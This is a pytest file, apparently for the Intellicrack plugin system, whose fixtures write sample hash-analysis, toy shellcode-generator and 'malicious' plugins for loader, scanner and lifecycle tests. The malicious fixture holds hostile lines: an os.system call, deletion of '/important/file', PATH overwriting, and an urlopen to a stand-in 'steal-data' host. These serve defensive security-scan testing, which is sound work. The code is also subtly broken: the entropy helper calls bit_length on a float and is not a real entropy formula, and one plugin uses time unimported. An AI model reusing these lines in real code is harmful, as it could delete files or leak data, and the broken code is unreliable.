"""
Functional tests for Intellicrack's plugin system operations.

This module contains comprehensive tests for REAL plugin system operations in Intellicrack,
including plugin loading and discovery operations, plugin execution with validation,
plugin security validation and sandboxing, plugin manager operations,
plugin lifecycle management, plugin error handling and recovery,
plugin performance monitoring, plugin dependency management,
plugin hot reload functionality, and plugin resource management and cleanup.
These tests ensure the plugin system works correctly with real plugins
and maintains proper security, performance, and resource management.
"""

"""
Functional tests for Intellicrack's plugin system operations.

This module contains comprehensive tests for plugin system operations in Intellicrack,
including plugin loading and discovery operations, plugin execution with validation,
plugin security validation and sandboxing, plugin manager operations,
plugin lifecycle management, plugin error handling and recovery,
plugin performance monitoring, plugin dependency management,
plugin hot reload functionality, and plugin resource management and cleanup.
These tests ensure the plugin system works correctly with real plugins
and maintains proper security, performance, and resource management.
"""

import pytest
import tempfile
import os
import sys
import importlib
import inspect
import json
import time
from pathlib import Path
from typing import Dict, List, Any

from intellicrack.plugins.plugin_system import PluginSystem
from intellicrack.plugins.plugin_manager import PluginManager
from intellicrack.plugins.plugin_loader import PluginLoader
from intellicrack.plugins.plugin_validator import PluginValidator
from intellicrack.plugins.plugin_security import PluginSecurity
from intellicrack.core.app_context import AppContext


class TestRealPluginOperations:
    """Functional tests for REAL plugin system operations."""

    @pytest.fixture
    def app_context(self):
        """Create REAL application context."""
        context = AppContext()
        context.initialize()
        return context

    @pytest.fixture
    def plugin_directory(self):
        """Create REAL plugin directory with test plugins."""
        temp_dir = tempfile.mkdtemp(prefix='intellicrack_plugins_')

        # Create plugin subdirectories
        subdirs = ['analysis', 'exploitation', 'custom_modules', 'utils']
        for subdir in subdirs:
            os.makedirs(os.path.join(temp_dir, subdir), exist_ok=True)

        yield temp_dir

        # Cleanup
        try:
            import shutil
            shutil.rmtree(temp_dir)
        except Exception:
            pass

    @pytest.fixture
    def sample_analysis_plugin(self, plugin_directory):
        """Create REAL analysis plugin for testing."""
        plugin_code = '''
import hashlib
import struct
from typing import Dict, Any

class BinaryHashAnalyzer:
    """Sample analysis plugin for binary hash calculation."""

    def __init__(self):
        self.name = "Binary Hash Analyzer"
        self.version = "1.0.0"
        self.author = "Test Plugin System"
        self.description = "Calculates multiple hashes for binary files"
        self.capabilities = ["hash_analysis", "file_analysis"]

    def get_plugin_info(self) -> Dict[str, Any]:
        """Return plugin information."""
        return {
            'name': self.name,
            'version': self.version,
            'author': self.author,
            'description': self.description,
            'capabilities': self.capabilities,
            'plugin_type': 'analysis'
        }

    def analyze_file(self, file_path: str) -> Dict[str, Any]:
        """Analyze binary file and return hash information."""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()

            results = {
                'file_path': file_path,
                'file_size': len(data),
                'hashes': {
                    'md5': hashlib.md5(data).hexdigest(),
                    'sha1': hashlib.sha1(data).hexdigest(),
                    'sha256': hashlib.sha256(data).hexdigest()
                },
                'entropy': self._calculate_entropy(data),
                'pe_header_detected': data.startswith(b'MZ') if len(data) > 2 else False
            }

            return {
                'success': True,
                'results': results,
                'plugin_name': self.name
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'plugin_name': self.name
            }

    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy of data."""
        if not data:
            return 0.0

        byte_counts = [0] * 256
        for byte in data:
            byte_counts[byte] += 1

        entropy = 0.0
        data_len = len(data)

        for count in byte_counts:
            if count > 0:
                probability = count / data_len
                entropy -= probability * (probability.bit_length() - 1)

        return entropy

    def validate_input(self, input_data: Dict[str, Any]) -> bool:
        """Validate plugin input."""
        return 'file_path' in input_data and os.path.exists(input_data['file_path'])

    def cleanup(self):
        """Cleanup plugin resources."""
        pass

# Plugin entry point
def create_plugin():
    return BinaryHashAnalyzer()
'''

        plugin_file = os.path.join(plugin_directory, 'analysis', 'hash_analyzer.py')
        with open(plugin_file, 'w') as f:
            f.write(plugin_code)

        return plugin_file

    @pytest.fixture
    def sample_exploitation_plugin(self, plugin_directory):
        """Create REAL exploitation plugin for testing."""
        plugin_code = '''
import struct
import random
from typing import Dict, Any, List

class SimpleExploitGenerator:
    """Sample exploitation plugin for basic exploit generation."""

    def __init__(self):
        self.name = "Simple Exploit Generator"
        self.version = "1.0.0"
        self.author = "Test Plugin System"
        self.description = "Generates basic exploit payloads"
        self.capabilities = ["exploit_generation", "payload_creation"]

    def get_plugin_info(self) -> Dict[str, Any]:
        """Return plugin information."""
        return {
            'name': self.name,
            'version': self.version,
            'author': self.author,
            'description': self.description,
            'capabilities': self.capabilities,
            'plugin_type': 'exploitation'
        }

    def generate_payload(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate exploit payload based on target information."""
        try:
            payload_type = target_info.get('payload_type', 'shellcode')
            architecture = target_info.get('architecture', 'x86')

            if payload_type == 'shellcode':
                payload = self._generate_shellcode(architecture)
            elif payload_type == 'rop_chain':
                payload = self._generate_rop_chain(target_info)
            else:
                payload = self._generate_generic_payload()

            return {
                'success': True,
                'payload': payload,
                'payload_type': payload_type,
                'architecture': architecture,
                'size': len(payload),
                'plugin_name': self.name
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'plugin_name': self.name
            }

    def _generate_shellcode(self, architecture: str) -> bytes:
        """Generate sample shellcode."""
        if architecture == 'x86':
            # Simple x86 NOP sled + ret
            return b'\\x90' * 16 + b'\\xc3'
        elif architecture == 'x64':
            # Simple x64 NOP sled + ret
            return b'\\x90' * 16 + b'\\xc3'
        else:
            return b'\\x90' * 32

    def _generate_rop_chain(self, target_info: Dict[str, Any]) -> bytes:
        """Generate sample ROP chain."""
        base_address = target_info.get('base_address', 0x400000)
        gadgets = target_info.get('gadgets', [])

        if not gadgets:
            # Generate fake gadgets for testing
            gadgets = [base_address + i * 8 for i in range(5)]

        chain = b''
        for gadget in gadgets:
            chain += struct.pack('<Q', gadget)

        return chain

    def _generate_generic_payload(self) -> bytes:
        """Generate generic test payload."""
        payload = b'PAYLOAD_START'
        payload += bytes([random.randint(0, 255) for _ in range(32)])
        payload += b'PAYLOAD_END'
        return payload

    def analyze_target(self, binary_path: str) -> Dict[str, Any]:
        """Analyze target binary for exploitation opportunities."""
        try:
            with open(binary_path, 'rb') as f:
                data = f.read(1024)  # Read first 1KB

            analysis = {
                'file_type': 'PE' if data.startswith(b'MZ') else 'unknown',
                'size': len(data),
                'potential_vulnerabilities': [],
                'recommended_exploits': []
            }

            # Simple vulnerability detection
            if b'strcpy' in data:
                analysis['potential_vulnerabilities'].append('buffer_overflow')
                analysis['recommended_exploits'].append('stack_overflow')

            if b'printf' in data and b'%s' in data:
                analysis['potential_vulnerabilities'].append('format_string')
                analysis['recommended_exploits'].append('format_string_exploit')

            return {
                'success': True,
                'analysis': analysis,
                'plugin_name': self.name
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'plugin_name': self.name
            }

    def validate_input(self, input_data: Dict[str, Any]) -> bool:
        """Validate plugin input."""
        required_fields = ['payload_type', 'architecture']
        return all(field in input_data for field in required_fields)

    def cleanup(self):
        """Cleanup plugin resources."""
        pass

# Plugin entry point
def create_plugin():
    return SimpleExploitGenerator()
'''

        plugin_file = os.path.join(plugin_directory, 'exploitation', 'exploit_generator.py')
        with open(plugin_file, 'w') as f:
            f.write(plugin_code)

        return plugin_file

    @pytest.fixture
    def sample_malicious_plugin(self, plugin_directory):
        """Create potentially malicious plugin for security testing."""
        malicious_code = '''
import os
import sys

class MaliciousPlugin:
    """Plugin that attempts unsafe operations."""

    def __init__(self):
        self.name = "Malicious Plugin"
        self.version = "1.0.0"
        self.author = "Bad Actor"
        self.description = "This plugin attempts unsafe operations"

        # Attempt dangerous operations in constructor
        try:
            os.system('echo "MALICIOUS_OPERATION" > /tmp/malicious_test.txt')
        except:
            pass

    def get_plugin_info(self):
        return {
            'name': self.name,
            'version': self.version,
            'author': self.author,
            'description': self.description,
            'plugin_type': 'malicious'
        }

    def dangerous_operation(self):
        """Attempt to perform dangerous operations."""
        # File system access
        try:
            os.remove('/important/file')
        except:
            pass

        # Network access
        try:
            import urllib.request
            urllib.request.urlopen('http://malicious-site.com/steal-data')
        except:
            pass

        # Environment manipulation
        try:
            os.environ['PATH'] = '/malicious/path'
        except:
            pass

        return "Dangerous operations attempted"

def create_plugin():
    return MaliciousPlugin()
'''

        plugin_file = os.path.join(plugin_directory, 'custom_modules', 'malicious_plugin.py')
        with open(plugin_file, 'w') as f:
            f.write(malicious_code)

        return plugin_file

    @pytest.fixture
    def test_binary_file(self):
        """Create test binary file for plugin analysis."""
        with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as temp_file:
            # Create minimal PE structure
            dos_header = b'MZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00\\x00'
            dos_header += b'\\xb8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
            dos_header += b'\\x00' * 40
            dos_header += b'\\x80\\x00\\x00\\x00'  # PE offset
            dos_header += b'\\x00' * 60

            pe_signature = b'PE\\x00\\x00'
            coff_header = b'\\x4c\\x01\\x03\\x00' + b'\\x00' * 16

            # Add some code with potential vulnerabilities
            code_section = b'strcpy printf %s gets scanf'
            code_section += b'\\x90' * (256 - len(code_section))

            temp_file.write(dos_header + pe_signature + coff_header + code_section)
            temp_file.flush()
            yield temp_file.name

        try:
            os.unlink(temp_file.name)
        except Exception:
            pass

    def test_real_plugin_loading_and_discovery(self, plugin_directory, sample_analysis_plugin, sample_exploitation_plugin, app_context):
        """Test REAL plugin loading and discovery operations."""
        plugin_system = PluginSystem(app_context)
        plugin_loader = PluginLoader()

        # Discover plugins in directory
        discovery_result = plugin_system.discover_plugins(plugin_directory)
        assert discovery_result is not None, "Plugin discovery must succeed"
        assert 'plugins_found' in discovery_result, "Must report found plugins"
        assert len(discovery_result['plugins_found']) >= 2, "Must find at least 2 plugins"

        # Verify discovered plugins
        plugin_paths = discovery_result['plugins_found']
        analysis_found = any('hash_analyzer.py' in path for path in plugin_paths)
        exploitation_found = any('exploit_generator.py' in path for path in plugin_paths)

        assert analysis_found, "Must discover analysis plugin"
        assert exploitation_found, "Must discover exploitation plugin"

        # Load specific plugin
        analysis_plugin_result = plugin_loader.load_plugin(sample_analysis_plugin)
        assert analysis_plugin_result is not None, "Plugin loading must succeed"
        assert analysis_plugin_result['success'], "Load operation must be successful"
        assert 'plugin_instance' in analysis_plugin_result, "Must return plugin instance"
        assert 'plugin_info' in analysis_plugin_result, "Must return plugin info"

        # Verify plugin instance
        plugin_instance = analysis_plugin_result['plugin_instance']
        assert hasattr(plugin_instance, 'analyze_file'), "Plugin must have analyze_file method"
        assert hasattr(plugin_instance, 'get_plugin_info'), "Plugin must have get_plugin_info method"

        # Verify plugin info
        plugin_info = analysis_plugin_result['plugin_info']
        assert plugin_info['name'] == 'Binary Hash Analyzer', "Must extract correct name"
        assert plugin_info['plugin_type'] == 'analysis', "Must identify plugin type"
        assert 'hash_analysis' in plugin_info['capabilities'], "Must list capabilities"

    def test_real_plugin_execution_and_validation(self, sample_analysis_plugin, test_binary_file, app_context):
        """Test REAL plugin execution with validation."""
        plugin_loader = PluginLoader()
        plugin_validator = PluginValidator()

        # Load plugin
        load_result = plugin_loader.load_plugin(sample_analysis_plugin)
        assert load_result['success'], "Plugin loading must succeed"

        plugin_instance = load_result['plugin_instance']

        # Validate plugin interface
        validation_result = plugin_validator.validate_plugin_interface(plugin_instance)
        assert validation_result is not None, "Interface validation must succeed"
        assert validation_result['valid'], "Plugin interface must be valid"
        assert 'required_methods' in validation_result, "Must check required methods"
        assert 'capabilities_verified' in validation_result, "Must verify capabilities"

        # Execute plugin with real data
        analysis_input = {'file_path': test_binary_file}

        # Validate input first
        input_valid = plugin_instance.validate_input(analysis_input)
        assert input_valid, "Input validation must pass"

        # Execute analysis
        execution_result = plugin_instance.analyze_file(test_binary_file)
        assert execution_result is not None, "Plugin execution must return results"
        assert execution_result['success'], "Plugin execution must succeed"
        assert 'results' in execution_result, "Must return analysis results"

        # Verify analysis results
        results = execution_result['results']
        assert 'file_path' in results, "Must include file path"
        assert 'file_size' in results, "Must include file size"
        assert 'hashes' in results, "Must include hash calculations"
        assert 'entropy' in results, "Must include entropy calculation"
        assert 'pe_header_detected' in results, "Must detect PE header"

        # Verify hash calculations
        hashes = results['hashes']
        assert 'md5' in hashes, "Must calculate MD5"
        assert 'sha1' in hashes, "Must calculate SHA1"
        assert 'sha256' in hashes, "Must calculate SHA256"
        assert len(hashes['md5']) == 32, "MD5 must be 32 hex chars"
        assert len(hashes['sha1']) == 40, "SHA1 must be 40 hex chars"
        assert len(hashes['sha256']) == 64, "SHA256 must be 64 hex chars"

        # Verify entropy calculation
        assert isinstance(results['entropy'], float), "Entropy must be float"
        assert 0.0 <= results['entropy'] <= 8.0, "Entropy must be in valid range"

        # Verify PE detection
        assert results['pe_header_detected'], "Must detect PE header in test file"

    def test_real_plugin_security_validation(self, sample_malicious_plugin, app_context):
        """Test REAL plugin security validation and sandboxing."""
        plugin_security = PluginSecurity()
        plugin_loader = PluginLoader()

        # Security scan before loading
        security_scan = plugin_security.scan_plugin_file(sample_malicious_plugin)
        assert security_scan is not None, "Security scan must succeed"
        assert 'threats_detected' in security_scan, "Must report threat detection"
        assert 'risk_level' in security_scan, "Must assess risk level"
        assert 'suspicious_operations' in security_scan, "Must identify suspicious operations"

        # Verify threat detection
        threats = security_scan['threats_detected']
        assert len(threats) > 0, "Must detect threats in malicious plugin"

        suspicious_ops = security_scan['suspicious_operations']
        assert any('os.system' in op for op in suspicious_ops), "Must detect os.system usage"
        assert any('os.remove' in op for op in suspicious_ops), "Must detect file deletion"

        # Test with security restrictions
        secure_load_result = plugin_loader.load_plugin_secure(
            sample_malicious_plugin,
            security_restrictions={
                'allow_file_operations': False,
                'allow_network_access': False,
                'allow_system_calls': False
            }
        )

        # Should either fail to load or load with restrictions
        if secure_load_result['success']:
            assert 'security_restrictions_applied' in secure_load_result, "Must apply security restrictions"
            assert secure_load_result['security_restrictions_applied'], "Restrictions must be active"
        else:
            assert 'security_violation' in secure_load_result['error'], "Must identify security violation"

    def test_real_plugin_manager_operations(self, plugin_directory, sample_analysis_plugin, sample_exploitation_plugin, app_context):
        """Test REAL plugin manager operations."""
        plugin_manager = PluginManager(app_context)

        # Initialize plugin manager
        init_result = plugin_manager.initialize(plugin_directory)
        assert init_result['success'], "Plugin manager initialization must succeed"
        assert 'plugins_loaded' in init_result, "Must report loaded plugins count"

        # List available plugins
        available_plugins = plugin_manager.list_available_plugins()
        assert isinstance(available_plugins, list), "Available plugins must be a list"
        assert len(available_plugins) >= 2, "Must have at least 2 plugins available"

        # Verify plugin information
        plugin_names = [p['name'] for p in available_plugins]
        assert 'Binary Hash Analyzer' in plugin_names, "Must include analysis plugin"
        assert 'Simple Exploit Generator' in plugin_names, "Must include exploitation plugin"

        # Get plugin by name
        analysis_plugin = plugin_manager.get_plugin('Binary Hash Analyzer')
        assert analysis_plugin is not None, "Must retrieve plugin by name"
        assert hasattr(analysis_plugin, 'analyze_file'), "Retrieved plugin must have correct interface"

        # Get plugins by capability
        hash_plugins = plugin_manager.get_plugins_by_capability('hash_analysis')
        assert len(hash_plugins) >= 1, "Must find plugins with hash analysis capability"
        assert any(p.__class__.__name__ == 'BinaryHashAnalyzer' for p in hash_plugins), "Must include hash analyzer"

        # Get plugins by type
        analysis_plugins = plugin_manager.get_plugins_by_type('analysis')
        assert len(analysis_plugins) >= 1, "Must find analysis plugins"

        exploitation_plugins = plugin_manager.get_plugins_by_type('exploitation')
        assert len(exploitation_plugins) >= 1, "Must find exploitation plugins"

    def test_real_plugin_lifecycle_management(self, sample_analysis_plugin, app_context):
        """Test REAL plugin lifecycle management."""
        plugin_manager = PluginManager(app_context)

        # Load plugin
        load_result = plugin_manager.load_single_plugin(sample_analysis_plugin)
        assert load_result['success'], "Plugin loading must succeed"

        plugin_id = load_result['plugin_id']
        assert plugin_id is not None, "Must assign plugin ID"

        # Check plugin status
        status = plugin_manager.get_plugin_status(plugin_id)
        assert status is not None, "Must retrieve plugin status"
        assert status['state'] == 'loaded', "Plugin must be in loaded state"
        assert status['active'], "Plugin must be active"

        # Enable/disable plugin
        disable_result = plugin_manager.disable_plugin(plugin_id)
        assert disable_result['success'], "Plugin disable must succeed"

        disabled_status = plugin_manager.get_plugin_status(plugin_id)
        assert not disabled_status['active'], "Plugin must be inactive after disable"

        enable_result = plugin_manager.enable_plugin(plugin_id)
        assert enable_result['success'], "Plugin enable must succeed"

        enabled_status = plugin_manager.get_plugin_status(plugin_id)
        assert enabled_status['active'], "Plugin must be active after enable"

        # Unload plugin
        unload_result = plugin_manager.unload_plugin(plugin_id)
        assert unload_result['success'], "Plugin unload must succeed"

        # Verify plugin is unloaded
        unloaded_status = plugin_manager.get_plugin_status(plugin_id)
        assert unloaded_status is None or unloaded_status['state'] == 'unloaded', "Plugin must be unloaded"

    def test_real_plugin_error_handling(self, plugin_directory, app_context):
        """Test REAL plugin error handling and recovery."""
        plugin_loader = PluginLoader()
        plugin_manager = PluginManager(app_context)

        # Test loading non-existent plugin
        nonexistent_result = plugin_loader.load_plugin('/nonexistent/plugin.py')
        assert nonexistent_result is not None, "Must handle non-existent plugin"
        assert not nonexistent_result['success'], "Loading non-existent plugin must fail"
        assert 'file_not_found' in nonexistent_result['error'], "Must identify file not found"

        # Test loading invalid Python file
        invalid_plugin = os.path.join(plugin_directory, 'invalid.py')
        with open(invalid_plugin, 'w') as f:
            f.write('invalid python syntax {{{')

        invalid_result = plugin_loader.load_plugin(invalid_plugin)
        assert not invalid_result['success'], "Loading invalid plugin must fail"
        assert 'syntax_error' in invalid_result['error'], "Must identify syntax error"

        # Test plugin with missing required methods
        incomplete_plugin = os.path.join(plugin_directory, 'incomplete.py')
        with open(incomplete_plugin, 'w') as f:
            f.write('''
class IncompletePlugin:
    def __init__(self):
        pass
    # Missing required methods

def create_plugin():
    return IncompletePlugin()
''')

        incomplete_result = plugin_loader.load_plugin(incomplete_plugin)
        if incomplete_result['success']:
            # Plugin loads but validation should fail
            validator = PluginValidator()
            validation = validator.validate_plugin_interface(incomplete_result['plugin_instance'])
            assert not validation['valid'], "Incomplete plugin must fail validation"
        else:
            assert 'interface_error' in incomplete_result['error'], "Must identify interface error"

    def test_real_plugin_performance_monitoring(self, sample_analysis_plugin, test_binary_file, app_context):
        """Test REAL plugin performance monitoring."""
        plugin_manager = PluginManager(app_context)

        # Load plugin with performance monitoring
        load_result = plugin_manager.load_single_plugin(
            sample_analysis_plugin,
            enable_monitoring=True
        )
        assert load_result['success'], "Plugin loading with monitoring must succeed"

        plugin_id = load_result['plugin_id']
        plugin_instance = plugin_manager.get_plugin_by_id(plugin_id)

        # Execute plugin multiple times
        execution_times = []
        for i in range(5):
            start_time = time.time()
            result = plugin_instance.analyze_file(test_binary_file)
            end_time = time.time()

            execution_times.append(end_time - start_time)
            assert result['success'], f"Execution {i} must succeed"

        # Get performance metrics
        performance_metrics = plugin_manager.get_plugin_performance(plugin_id)
        assert performance_metrics is not None, "Must retrieve performance metrics"
        assert 'execution_count' in performance_metrics, "Must track execution count"
        assert 'average_execution_time' in performance_metrics, "Must calculate average time"
        assert 'total_execution_time' in performance_metrics, "Must track total time"

        # Verify metrics accuracy
        assert performance_metrics['execution_count'] >= 5, "Must count all executions"
        avg_time = sum(execution_times) / len(execution_times)
        assert abs(performance_metrics['average_execution_time'] - avg_time) < 0.1, "Average time must be accurate"

    def test_real_plugin_dependency_management(self, plugin_directory, app_context):
        """Test REAL plugin dependency management."""
        plugin_manager = PluginManager(app_context)

        # Create plugin with dependencies
        dependent_plugin_code = '''
from hash_analyzer import BinaryHashAnalyzer

class DependentPlugin:
    def __init__(self):
        self.name = "Dependent Plugin"
        self.version = "1.0.0"
        self.dependencies = ["Binary Hash Analyzer"]
        self.hash_analyzer = None

    def get_plugin_info(self):
        return {
            'name': self.name,
            'version': self.version,
            'dependencies': self.dependencies,
            'plugin_type': 'analysis'
        }

    def initialize_dependencies(self, dependency_manager):
        self.hash_analyzer = dependency_manager.get_plugin("Binary Hash Analyzer")
        return self.hash_analyzer is not None

    def enhanced_analysis(self, file_path):
        if not self.hash_analyzer:
            return {'success': False, 'error': 'Dependencies not initialized'}

        hash_result = self.hash_analyzer.analyze_file(file_path)
        if not hash_result['success']:
            return hash_result

        # Add enhanced analysis
        enhanced_data = hash_result['results'].copy()
        enhanced_data['enhanced_analysis'] = True
        enhanced_data['analysis_timestamp'] = time.time()

        return {
            'success': True,
            'results': enhanced_data,
            'plugin_name': self.name
        }

def create_plugin():
    return DependentPlugin()
'''

        dependent_plugin_file = os.path.join(plugin_directory, 'analysis', 'dependent_plugin.py')
        with open(dependent_plugin_file, 'w') as f:
            f.write(dependent_plugin_code)

        # Initialize plugin manager with dependency resolution
        init_result = plugin_manager.initialize(plugin_directory, resolve_dependencies=True)
        assert init_result['success'], "Initialization with dependencies must succeed"

        # Check dependency resolution
        if 'dependency_resolution' in init_result:
            dep_resolution = init_result['dependency_resolution']
            assert 'resolved_dependencies' in dep_resolution, "Must resolve dependencies"
            assert 'unresolved_dependencies' in dep_resolution, "Must track unresolved"

    def test_real_plugin_hot_reload(self, sample_analysis_plugin, app_context):
        """Test REAL plugin hot reload functionality."""
        plugin_manager = PluginManager(app_context)

        # Load plugin
        load_result = plugin_manager.load_single_plugin(sample_analysis_plugin)
        assert load_result['success'], "Initial plugin loading must succeed"

        plugin_id = load_result['plugin_id']
        original_plugin = plugin_manager.get_plugin_by_id(plugin_id)
        original_version = original_plugin.version

        # Modify plugin file (simulate update)
        time.sleep(0.1)  # Ensure different modification time
        content = Path(sample_analysis_plugin).read_text()
        # Update version in plugin
        updated_content = content.replace('version = "1.0.0"', 'version = "1.0.1"')
        with open(sample_analysis_plugin, 'w') as f:
            f.write(updated_content)

        # Trigger hot reload
        reload_result = plugin_manager.hot_reload_plugin(plugin_id)
        assert reload_result is not None, "Hot reload must be attempted"

        if reload_result['success']:
            # Verify plugin was reloaded
            reloaded_plugin = plugin_manager.get_plugin_by_id(plugin_id)
            assert reloaded_plugin.version == "1.0.1", "Plugin version must be updated"
            assert reloaded_plugin.version != original_version, "Version must change after reload"
        else:
            # Hot reload may not be supported - verify error handling
            assert 'not_supported' in reload_result['error'] or 'reload_failed' in reload_result['error'], \
                    "Must provide clear error message for reload failure"

    def test_real_plugin_resource_management(self, sample_exploitation_plugin, test_binary_file, app_context):
        """Test REAL plugin resource management and cleanup."""
        plugin_manager = PluginManager(app_context)

        # Load plugin
        load_result = plugin_manager.load_single_plugin(sample_exploitation_plugin)
        assert load_result['success'], "Plugin loading must succeed"

        plugin_id = load_result['plugin_id']
        plugin_instance = plugin_manager.get_plugin_by_id(plugin_id)

        # Track resource usage before operations
        initial_resources = plugin_manager.get_resource_usage(plugin_id)

        # Perform multiple plugin operations
        for i in range(10):
            target_info = {
                'payload_type': 'shellcode',
                'architecture': 'x86',
                'base_address': 0x400000 + i * 0x1000
            }

            payload_result = plugin_instance.generate_payload(target_info)
            assert payload_result['success'], f"Payload generation {i} must succeed"

            analysis_result = plugin_instance.analyze_target(test_binary_file)
            assert analysis_result['success'], f"Target analysis {i} must succeed"

        # Check resource usage after operations
        final_resources = plugin_manager.get_resource_usage(plugin_id)

        if initial_resources and final_resources:
            # Verify resource tracking
            assert 'memory_usage' in final_resources, "Must track memory usage"
            assert 'execution_count' in final_resources, "Must track execution count"
            assert final_resources['execution_count'] > initial_resources['execution_count'], \
                    "Execution count must increase"

        # Test plugin cleanup
        cleanup_result = plugin_manager.cleanup_plugin_resources(plugin_id)
        assert cleanup_result['success'], "Plugin resource cleanup must succeed"

        if post_cleanup_resources := plugin_manager.get_resource_usage(plugin_id):
            assert post_cleanup_resources['memory_usage'] <= final_resources['memory_usage'], \
                    "Memory usage should not increase after cleanup"
